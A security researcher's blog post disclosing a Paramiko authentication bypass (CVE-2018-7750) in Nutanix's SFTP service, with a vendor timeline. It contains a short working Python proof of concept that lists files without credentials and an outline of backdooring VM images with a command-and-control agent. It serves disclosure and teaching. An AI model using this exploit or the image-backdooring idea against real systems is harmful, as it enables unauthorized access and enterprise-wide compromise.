---
title: Paramiko SSH Authentication Bypass in Nutanix
category: Security
tags: [red-team, pentest, hacking, security, tutorial]
---


It's been a while since I've written anything. This post has honestly been queued up for quite a while, but as I was waiting for the vendor to patch the issue I kind of forgot about the post :) Luckily, everything has been patched now, and I can share about an ssh/sftp authentication bypass I found!


## Nutanix

While on a pentest several months back, I came across an SSH server running on an unusual port, `2222`. Ok, it's not that unusual, but in any case I was intrigued. So, I started enumerating the box further to figure out what the box was for, and what service was running that SSH server. It turns out, the box was part of a software suite developed by [Nutanix](https://www.nutanix.com/). Nutanix has several products that allow for site-management at multiple levels. From VM/Image storage solutions to full hyperconverged infrastructure (HCI) technology that allows for the integration of compute, virtualization, storage, networking and security to power any application, at any scale. What? Basically, it's a great tool for the management of datacenter infrastructure and applications.

## The Vulnerability

Now for the fun stuff. As I further enumerated the unfamiliar port on this now-identified Nutanix box, I found that the SSH server was actually being ran by `Paramiko v1.15.2`. This library is listed in [CVE-2018-7750](https://www.cvedetails.com/cve/CVE-2018-7750) as being vulnerable to an authentication bypass. At this point I got excited, but I could find no proof-of-concept (PoC) code about how to bypass the login prompt. So, I continued my research, and stumbled upon [this issue](https://github.com/paramiko/paramiko/issues/1175) on GitHub. The discussion gave me enough of a clue to allow me to build the following PoC in order to exploit the vulnerable library.

```python
import paramiko

host = '127.0.0.1'
port = 2222

trans = paramiko.Transport((host, port))
trans.start_client()

# If the call below is skipped, no username or password is required.
# trans.auth_password('username', 'password')

sftp = paramiko.SFTPClient.from_transport(trans)
print(sftp.listdir('/'))
sftp.close()
```

If you ignored the GitHub issue above, the TLDR is that the RFC is unclear about whether channels should be opened for clients that haven't successfully completed the `auth` step of the SSH protocol. Thus, Paramiko and a few other SSH servers would open a channel for clients that had not authenticated first.


## Big Deal, It's an SFTP Server

You might be thinking, "Ok but this isn't a big deal. It's an SFTP server, it's not like you're getting code execution." But that's where this vulnerability gets interesting. As part of the [Nutanix Acropolis](https://www.nutanix.com/products/acropolis/) suite, an SFTP server is deployed to allow the **_management of virtual machines and images_**. That means uploading, downloading, and deleting images used to deploy applications across an entire enterprise! To get code execution here, one merely needs to download an image, install a command-and-control agent, and re-upload the image to the Acropolis server. Then, when new images are deployed, the agent will call out. The implications are far more dangerous when you start playing the long game.


## Vendor Response

Nutanix was contacted immediately once the issue was confirmed on June 13th. I received a response very quickly, and the team began immediate work on putting a plan in place to patch the issue. An e-mail on July 25th stated that a patch was lined up for release in the very near term, and on August 29th I received confirmation that the issue had been patched and released for all Nutanix customers as part of AOS and Prism Central versions 5.5.5 (Long Term Support) and 5.8.1 (Short Term Support). Overall, Nutanix seemed to take their product's security very seriously, and were extremely friendly to a researcher such as myself. It was a pleasure working with their team.

## Coffee Break!

This vulnerability really taught me that just because there's not an exploit built out already, doesn't mean it's not worth looking into no matter how much of a time crunch you're under. I only had one day to go from finding the vulnerability, to showing the impact of the exploit. Don't skip over something just because it doesn't *appear* to be easy. Compromise might just be 8 lines of python away ;). Until next time, happy hacking!
